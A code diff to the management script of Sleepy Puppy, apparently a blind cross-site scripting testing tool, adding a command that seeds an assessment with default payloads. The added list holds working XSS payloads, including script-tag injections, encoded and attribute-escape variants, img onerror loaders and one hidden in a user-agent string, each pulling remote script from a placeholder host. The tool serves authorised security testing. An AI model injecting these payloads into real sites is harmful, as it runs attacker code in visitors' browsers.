@@ -59,10 +59,48 @@ def create_login(login):
         else:
             print 'passwords do not match!'
 
-
     db.session.add(admin_user)
     db.session.commit()
     return
+
+from collections import namedtuple
+DefaultPayload = namedtuple('DefaultPayload', ['payload', 'url', 'method', 'parameter', 'notes'])
+DEFAULT_PAYLOADS=[
+    DefaultPayload('<script src=$1></script>', None, 'GET', None, 'Generic'),
+    DefaultPayload('</script><script src=$1>', None, 'GET', None, 'Reversed'),
+    DefaultPayload('&lt;script src=$1&gt;&lt;/script&gt;', None, 'GET', None, 'Generic Encoded'),
+    DefaultPayload('&lt;/script&gt;&lt;script src=$1&gt;', None, 'GET', None, 'Generic Reversed'),
+    DefaultPayload('''" onload="var s=document.createElement('script');s.src='$1';document.getElementsByTagName('head')[0].appendChild(s);" garbage="''', None, 'GET', None, 'DOM Attribute Escape'),
+    DefaultPayload("""'"><img src=x onerror="var s=document.createElement('script');s.src='$1';document.getElementsByTagName('head')[0].appendChild(s);">""", None, 'GET', None, 'For where "<script" is banned'),
+    DefaultPayload("""Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.36 '"><img src=x onerror="var s=document.createElement('script');s.src='$1';document.getElementsByTagName('head')[0].appendChild(s);">""", None, 'GET', None, 'Promiscuous User Agent')
+]
+
+@manager.command
+def create_bootstrap_assessment(name="General", add_default_payloads=True):
+    """
+    Creates an assessment and attaches a few default payloads.
+    """
+    from sleepypuppy.admin.assessment.models import Assessment
+    from sleepypuppy.admin.payload.models import Payload
+    assessment = Assessment.query.filter(Assessment.name == name).first()
+    if assessment:
+        print("Assessment with name", name, "already exists.")
+    else:
+        assessment = Assessment(name=name)
+
+    if add_default_payloads:
+        for payload in DEFAULT_PAYLOADS:
+            payload = Payload(
+                payload=payload.payload,
+                url=payload.url,
+                method=payload.method,
+                parameter=payload.parameter,
+                notes=payload.notes
+            )
+            assessment.payloads.append(payload)
+    db.session.add(assessment)
+    db.session.commit()
+
 
 @manager.command
 def list_routes():
